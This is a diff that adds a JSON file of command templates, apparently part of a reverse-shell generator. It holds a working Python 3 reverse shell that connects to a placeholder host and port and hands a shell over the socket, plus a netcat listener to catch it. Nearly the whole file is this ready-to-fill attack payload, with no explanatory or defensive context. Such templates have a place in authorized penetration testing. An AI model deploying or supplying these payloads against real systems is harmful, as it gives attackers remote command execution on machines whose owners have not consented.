@@ -1,0 +1,14 @@
+{
+  "commands": [
+    {
+      "title": "Python3 Reverse Shell 1",
+      "template": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'",
+      "description": "Python 3 reverse shell using environment variables for host and port."
+    },
+    {
+      "title": "Netcat Listener",
+      "template": "nc -lvnp {port}",
+      "description": "Listener to catch the reverse shell on port {port}."
+    }
+  ]
+}
